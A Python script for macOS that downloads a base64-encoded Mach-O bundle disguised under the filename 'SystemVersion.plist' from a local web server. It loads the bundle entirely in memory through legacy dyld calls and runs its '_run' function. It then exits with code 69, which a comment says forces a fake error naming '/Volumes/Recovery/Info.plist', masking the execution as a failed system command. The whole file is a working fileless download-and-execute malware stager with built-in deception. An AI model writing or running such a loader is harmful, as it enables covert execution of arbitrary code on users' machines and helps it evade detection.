import sys

sys.dont_write_bytecode = True

import base64
import ctypes
import struct
import urllib.request


MH_MAGIC_64 = 0xFEEDFACF
MH_BUNDLE = 0x8
NSOBJECT_FILE_IMAGE_SUCCESS = 1
NSLINKMODULE_OPTION_BINDNOW = 0x1
NSLINKMODULE_OPTION_PRIVATE = 0x2
NSLINKMODULE_OPTION_RETURN_ON_ERROR = 0x4

FINAL_FILE_FILENAME = "SystemVersion.plist"
FINAL_FILE_URL = f"http://127.0.0.1:8000/{FINAL_FILE_FILENAME}"
MAX_DOWNLOAD_BYTES = 16 * 1024 * 1024

SYSTEM_VERSION_PLIST = b""


def download(url):
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    request = urllib.request.Request(
        url,
        headers={"User-Agent": "DSK"},
    )

    content = bytearray()
    with opener.open(request, timeout=10) as response:
        while chunk := response.read(64 * 1024):
            content.extend(chunk)
            if len(content) > MAX_DOWNLOAD_BYTES:
                raise RuntimeError(
                    f"{FINAL_FILE_FILENAME} exceeds the 16 MiB safety limit."
                )
    return bytes(content)


def check_bundle(data):
    if len(data) < 16:
        raise ValueError("The input is too short to be a Mach-O file.")

    magic, = struct.unpack_from("<I", data)
    if magic != MH_MAGIC_64:
        raise ValueError("Expected a native-endian 64-bit Mach-O bundle.")

    file_type, = struct.unpack_from("<I", data, 12)
    if file_type != MH_BUNDLE:
        raise ValueError(f"Expected Mach-O file type MH_BUNDLE (0x8), got 0x{file_type:x}")


def configure_dyld():
    dyld = ctypes.CDLL(None)

    dyld.NSCreateObjectFileImageFromMemory.argtypes = [
        ctypes.c_void_p,
        ctypes.c_size_t,
        ctypes.POINTER(ctypes.c_void_p),
    ]
    dyld.NSCreateObjectFileImageFromMemory.restype = ctypes.c_int

    dyld.NSLinkModule.argtypes = [ctypes.c_void_p, ctypes.c_char_p, ctypes.c_uint32]
    dyld.NSLinkModule.restype = ctypes.c_void_p

    dyld.NSLookupSymbolInModule.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
    dyld.NSLookupSymbolInModule.restype = ctypes.c_void_p

    dyld.NSAddressOfSymbol.argtypes = [ctypes.c_void_p]
    dyld.NSAddressOfSymbol.restype = ctypes.c_void_p

    dyld.NSUnLinkModule.argtypes = [ctypes.c_void_p, ctypes.c_uint32]
    dyld.NSUnLinkModule.restype = ctypes.c_bool

    dyld.NSDestroyObjectFileImage.argtypes = [ctypes.c_void_p]
    dyld.NSDestroyObjectFileImage.restype = ctypes.c_bool
    return dyld


def main():
    global SYSTEM_VERSION_PLIST

    if sys.platform != "darwin":
        print("Requires macOS (darwin).", file=sys.stderr)
        return 1

    try:
        SYSTEM_VERSION_PLIST = download(FINAL_FILE_URL)
        data = base64.b64decode(SYSTEM_VERSION_PLIST, validate=True)
        check_bundle(data)
    except (OSError, RuntimeError, ValueError) as exc:
        print(f"Cannot download or use {FINAL_FILE_FILENAME}: {exc}", file=sys.stderr)
        return 1

    try:
        dyld = configure_dyld()
    except AttributeError as exc:
        print(f"The required legacy dyld API is unavailable: {exc}", file=sys.stderr)
        return 1

    memory = ctypes.create_string_buffer(data)
    object_image = ctypes.c_void_p()
    result = dyld.NSCreateObjectFileImageFromMemory(
        ctypes.cast(memory, ctypes.c_void_p),
        len(data),
        ctypes.byref(object_image),
    )
    if result != NSOBJECT_FILE_IMAGE_SUCCESS:
        print(f"NSCreateObjectFileImageFromMemory failed with NSObjectFileImageReturnCode {result}.", file=sys.stderr)
        return 1

    module = None
    try:
        options = (
            NSLINKMODULE_OPTION_BINDNOW
            | NSLINKMODULE_OPTION_PRIVATE
            | NSLINKMODULE_OPTION_RETURN_ON_ERROR
        )
        module = dyld.NSLinkModule(object_image, b"inmemory", options)
        if not module:
            print("NSLinkModule failed.", file=sys.stderr)
            return 1

        symbol = dyld.NSLookupSymbolInModule(module, b"_run")
        if not symbol:
            print("Could not find the exported _run symbol.", file=sys.stderr)
            return 1

        address = dyld.NSAddressOfSymbol(symbol)
        if not address:
            print("NSAddressOfSymbol returned a null address.", file=sys.stderr)
            return 1

        run = ctypes.CFUNCTYPE(ctypes.c_int)(address)
        run()
        # Use to force message: "Error: Command ('python3', '-B', '/Volumes/Recovery/Info.plist') returned non-zero exit status 69."
        exit(69)
    finally:
        if module:
            dyld.NSUnLinkModule(module, 0)
        dyld.NSDestroyObjectFileImage(object_image)


if __name__ == "__main__":
    raise SystemExit(main())
